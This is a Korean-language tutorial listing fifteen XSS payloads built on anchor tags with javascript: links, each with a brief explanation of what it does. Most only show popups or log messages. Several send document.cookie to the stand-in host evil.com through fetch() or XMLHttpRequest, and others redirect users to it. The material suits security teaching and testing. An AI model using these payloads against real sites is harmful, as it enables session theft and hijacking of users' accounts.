## 🗿 <a href="javascript:...">

**`<a href="javascript:...">`** 형식은 **XSS 공격**에서 자주 사용되는 방식입니다. 이 방식은 브라우저에서 \*\*`href="javascript:"`\*\*를 통해 **JavaScript 코드**를 실행하게 하여, 사용자가 클릭만으로 **악성 코드를 실행**할 수 있게 만듭니다. 주로 **이벤트 핸들러**와 결합하여 다양한 **자바스크립트 동작**을 유도할 수 있습니다.

`<a href="javascript:...">`는 HTML의 `<a>` (anchor, 링크, 하이퍼링크를 생성하는 HTML 태그) 태그에 JavaScript 코드를 직접 삽입하여 특정 동작을 수행하게 하는 방식입니다. 이 방식은 링크 클릭 시 JavaScript가 실행되도록 만듭니다. 즉, 페이지 이동 대신 JavaScript 실행을 트리거합니다.

---

### 1. **`alert()` - 팝업 창**

* 클릭 시 **팝업 경고창**을 띄웁니다.

  ```html
  <a href="javascript:alert('XSS - alert')">Click me</a>
  ```

### 2. **`confirm()` - 확인 창**

* 클릭 시 **확인/취소**가 있는 **확인 창**을 띄웁니다.

  ```html
  <a href="javascript:confirm('XSS - confirm')">Click me</a>
  ```

### 3. **`prompt()` - 입력 창**

* 클릭 시 **입력창**을 띄워 사용자가 값을 입력할 수 있도록 합니다.

  ```html
  <a href="javascript:prompt('XSS - prompt')">Click me</a>
  ```

### 4. **`console.log()` - 콘솔 로그 출력**

* 클릭 시 **콘솔에 메시지**를 출력합니다. 가용성에 전혀 영향을 미치지 않으며, 개발자 도구에서만 확인 가능합니다.

  ```html
  <a href="javascript:console.log('XSS - console log')">Click me</a>
  ```

### 5. **`document.body.innerHTML` - DOM 수정**

* 클릭 시 **페이지의 내용**을 변경하여, 현재 페이지의 **본문**을 덮어씁니다.

  ```html
  <a href="javascript:document.body.innerHTML = '<h1>XSS - DOM manipulation</h1>'">Click me</a>
  ```

### 6. **`window.location` - 페이지 리디렉션**

* 클릭 시 사용자를 다른 페이지로 **리디렉션**합니다.

  ```html
  <a href="javascript:window.location.href='http://evil.com';">Click me</a>
  ```

### 7. **`document.cookie` - 쿠키 정보 조회**

* 클릭 시 **쿠키 정보를 로그**로 출력하거나 서버로 전송할 수 있습니다. 이 코드는 **정보 유출**을 초래할 수 있습니다.

  ```html
  <a href="javascript:console.log(document.cookie)">Click me</a>
  ```

### 8. **`fetch()` - 외부 서버로 데이터 전송**

* 클릭 시 **서버로 요청**을 보내서 **민감한 데이터**를 탈취할 수 있습니다.

  ```html
  <a href="javascript:fetch('http://evil.com/log?data=' + encodeURIComponent(document.cookie))">Click me</a>
  ```

### 9. **`setTimeout()` - 시간 지연 후 동작**

* 클릭 후, 일정 시간 후에 **특정 동작**을 실행하도록 할 수 있습니다.

  ```html
  <a href="javascript:setTimeout(function(){ alert('XSS - delayed action'); }, 2000)">Click me</a>
  ```

### 10. **`eval()` - 코드 실행**

* 클릭 시 \*\*`eval()`\*\*을 통해 **동적으로 생성된 코드**를 실행할 수 있습니다. **자주 악용됩니다**.

  ```html
  <a href="javascript:eval('alert(\'XSS - eval\')')">Click me</a>
  ```

### 11. **`localStorage` - 로컬 스토리지 조작**

* 클릭 시 **로컬 스토리지**에 값을 저장하거나 **불러오는 작업**을 수행합니다.

  ```html
  <a href="javascript:localStorage.setItem('XSS', 'detected')">Click me</a>
  ```

### 12. **`XMLHttpRequest` - 서버와 비동기 통신**

* 클릭 시 **서버로 데이터 전송**이나 **응답 처리**를 할 수 있습니다.

  ```html
  <a href="javascript:var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://evil.com/log?data=' + encodeURIComponent(document.cookie), true); xhr.send();">Click me</a>
  ```

### 13. **`document.createElement()` - DOM 요소 동적으로 추가**

* 클릭 시 **새로운 HTML 요소**를 동적으로 생성하고 페이지에 추가합니다.

  ```html
  <a href="javascript:var elem = document.createElement('div'); elem.textContent = 'XSS - New Element'; document.body.appendChild(elem);">Click me</a>
  ```

### 14. **`window.open()` - 새 창 열기**

* 클릭 시 **새로운 브라우저 창**을 열어 악성 웹사이트로 리디렉션하거나 정보를 탈취할 수 있습니다.

  ```html
  <a href="javascript:window.open('http://evil.com')">Click me</a>
  ```

### 15. **`history.pushState()` - 히스토리 상태 변경**

* 클릭 시 **브라우저 히스토리**를 변경하여 사용자가 돌아가기 기능을 사용할 수 없게 만듭니다.

  ```html
  <a href="javascript:history.pushState({}, 'XSS - state', '/evil');">Click me</a>
  ```
